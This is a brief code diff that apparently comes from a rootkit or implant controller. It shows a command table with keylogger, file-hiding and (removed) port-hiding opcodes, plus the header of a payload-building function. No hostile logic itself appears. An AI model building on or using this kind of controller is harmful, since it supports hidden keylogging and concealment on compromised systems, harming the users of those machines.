@@ -12,8 +12,6 @@ COMMAND_MAP = {
     "keylogger_stop":   {"opcode": 1, "type": "none"},
     "hide_file":   {"opcode": 2, "type": "string"},
     "unhide_file":   {"opcode": 3, "type": "string"},
-    "hide_port":   {"opcode": 4, "type": "int"},
-    "unhide_port":   {"opcode": 5, "type": "int"},
 }
 
 def build_payload(cmd_name: str, raw_arg: str | None) -> bytes:
